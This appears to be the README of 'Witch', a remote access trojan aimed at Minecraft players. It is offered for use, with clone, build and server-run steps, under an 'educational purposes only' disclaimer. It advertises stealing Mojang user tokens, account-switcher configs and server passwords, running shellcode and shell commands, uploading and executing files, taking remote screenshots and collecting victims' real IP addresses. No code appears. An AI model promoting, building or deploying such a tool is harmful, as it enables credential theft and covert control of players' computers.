<div align="center">
    <h1>Witch</h1><br>
    <img src="./client/src/main/resources/assets/witch/icon.png">  
</div>

New generation Minecraft RAT.

### For educational purposes only.

The Witch system controls Minecraft clients using websocket connections.

## Features

### System administration

- [X] System information
- [X] Execute shellcode (for Windows, 32 bit)
- [X] Shell commands
- [X] File upload & execute (for Windows)
- [X] Read text files
- [X] Get run arguments

### Social engineering

- [X] [IAS](https://modrinth.com/mod/in-game-account-switcher) mod config steal
- [X] Grab offline server passwords
- [X] Grab Mojang user tokens
- [X] Log chat & commands

### Player information

- [X] Remote screenshot
- [X] Mod list
- [X] Player info like coordinates, real ip, etc.
- [X] Player skin download

### Interaction

- [X] Chat system (in game)
- [X] Sending chat
- [X] Filter & mute chat
- [X] Kick people from server and prevent them from joining server

### Using

1. Run `git clone https://github.com/ThebestkillerTBK/witch.git`
2. Open in your favorite IDE

Client config in build.gradle

Server: `server.jar <port> <default_key>`

#### Directories:

* Root folder is `data`
* screenshots - Client screenshot
* logging - Player chat & command logs
* skins - Player skins
* data - Stolen token, config, etc.

### Contributing to the project

* Create PRs to make this mod better!
* Leave a star if you like it!

## Todo

* Help
* Web UI